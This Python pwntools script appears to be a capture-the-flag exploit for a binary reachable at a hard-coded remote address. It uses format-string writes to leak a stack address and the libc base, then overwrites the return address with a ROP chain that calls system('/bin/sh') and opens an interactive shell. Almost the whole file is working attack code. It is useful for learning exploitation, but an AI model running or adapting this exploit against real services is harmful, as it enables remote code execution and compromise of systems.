#!/usr/bin/env python3

from pwn import *

exe = context.binary = ELF(args.EXE or '', checksec=True)
libc = exe.libc
# context.terminal = ["terminator", "-u", "-e"]
context.terminal = ["remotinator", "vsplit", "-x"]

gdbscript = '''
b *main+263
continue
'''

pre_argv = []
post_argv = []

def get_conn(pre_argv=[], post_argv=[], gdbscript="", *a, **kw):
    host = args.HOST or '34.45.235.239'
    port = int(args.PORT or 4003)
    gdbscript = '\n'.join(line for line in gdbscript.splitlines() if line and not line.startswith('#'))
    exe_name = os.path.basename(exe.path)
    cmd = pre_argv + [exe.path] + post_argv

    if args.DOCKER:
        if args.REMOTE:
            p = remote(host, port, *a, **kw)
        else:
            p = process(f'docker run -i --rm {args.DOCKER}', shell=True)
        if args.GDB:
            sleep(1) # TODO: find better method
            gdb.attach(pidof(exe_name)[0], gdbscript=gdbscript, exe=exe.path, *a, **kw)
        return p
    if args.GDB:
        return gdb.debug(cmd, gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        return remote(host, port, *a, **kw)

    return process(cmd, *a, **kw)

io = get_conn(pre_argv, post_argv, gdbscript)
r = lambda *a, **k: io.recv(*a, **k)
rl = lambda *a, **k: io.recvline(*a, **k)
ru = lambda *a, **k: io.recvuntil(*a, **k)
cl = lambda *a, **k: io.clean(*a, **k)
s = lambda *a, **k: io.send(*a, **k)
sa = lambda *a, **k: io.sendafter(*a, **k)
sl = lambda *a, **k: io.sendline(*a, **k)
sla = lambda *a, **k: io.sendlineafter(*a, **k)
ia = lambda *a, **k: io.interactive(*a, **k)
rotate_left = lambda x, a, s=64: (x << a) | (x >> (s-a))
rotate_right = lambda x, a, s=64: (x >> a) | (x << (s-a))
safe_link = lambda addr, ptr: (addr >> 12) ^ ptr
ptr_mangle = lambda addr, cookie=0: rotate_left(addr ^ cookie, 17)
ptr_demangle = lambda addr, cookie=0: rotate_right(addr, 17) ^ cookie


def trace(func):
    def wrapper(*args, **kwargs):
        info(f"{func.__name__} {args} {kwargs}")
        return func(*args, **kwargs)
    return wrapper


sla(b'or flag??', b'gift  %p%')
rl()

stack_leak = rl().strip().decode()
stack_addr = int(stack_leak.split('ril')[0], 16)
info(f"stack_leak: {stack_addr:#x}")

retaddr = stack_addr + 0x90
ebp_minus_4 = stack_addr + 0x124
dup2_gadget = 0x2A

sa(b'Input', flat(
    b'22',
    b'%20$ln',
    f'%{dup2_gadget-2}c'.encode(),
    b'%21$hhn',
length=0x70) + flat(
    ebp_minus_4,
    retaddr
))

read_gadget = 0x74
cl()

sleep(1)
s(flat(
    b'%3$p',
    f'%{read_gadget-14}c'.encode(),
    b'%20$hhn',
length=0x70) + flat(
    retaddr
))
leak = r(20).strip().decode().split('0x')[1]
leak = int(leak, 16)
info(f'leak = {leak:#x}')

libc.address = -0x11ba61 + leak
info(f'libc.address = {libc.address:#x}')

g = libc.address + 0x001af88f # add rsp,0x38; ret
info(f'g={g:#x}')
low = g & 0xFFFFFFFF
hi = (g >> 32) & 0xFFFFFFFF
lowlow = low & 0xFFFF
lowhi = (low >> 16) & 0xFFFF

if hi > lowhi:
    lowhi = 0x10000+lowhi-hi
else:
    lowhi -= hi

sofar = (hi+lowhi ) % 0x10000

if sofar > lowlow:
    lowlow = 0x10000+lowlow-sofar
else:
    lowlow -= sofar

cl()

poprdi = libc.address + 0x001ae710#: pop rdi; ret;
binsh = next(libc.search(b'/bin/sh'))

sleep(1)
pld = flat(
    f'%{hi}c',
    b'%19$hn',
    f'%{lowhi}c',
    b'%20$hn',
    f'%{lowlow}c',
    b'%21$hn',
    b'A' * 0x12,
    p64(poprdi+1),
    p64(poprdi),
    binsh,
    libc.sym.system,
length=0x68) + flat(
    retaddr+4,
    retaddr+2,
    retaddr,
)


s(pld)
cl()


ia()
